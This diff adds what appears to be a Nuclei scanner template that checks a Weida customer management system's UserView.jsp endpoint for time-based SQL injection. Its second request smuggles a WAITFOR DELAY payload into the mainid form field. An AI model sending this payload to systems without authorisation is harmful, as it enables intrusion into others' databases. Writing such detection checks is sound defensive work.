@@ -1,0 +1,45 @@
+id: weida-UserView-sql
+
+info:
+  name: 维达客户管理系统 UserView.jsp 存在SQL注入漏洞
+  author: weida
+  severity: high
+  tags: weida
+
+http:
+  - raw:
+      - |
+        POST /wap/common/admin/UserView.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+
+        mainid=11
+
+      - |
+        POST /wap/common/admin/UserView.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+
+        mainid=11';WAITFOR DELAY '0:0:4'--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - 'duration_1 < 2'
+          - 'duration_2 >= 4'
+          - 'duration_2 <= 10'
+        condition: and
+      - type: word
+        part: body
+        words:
+          - '/wap/login.html'
+        condition: and
+
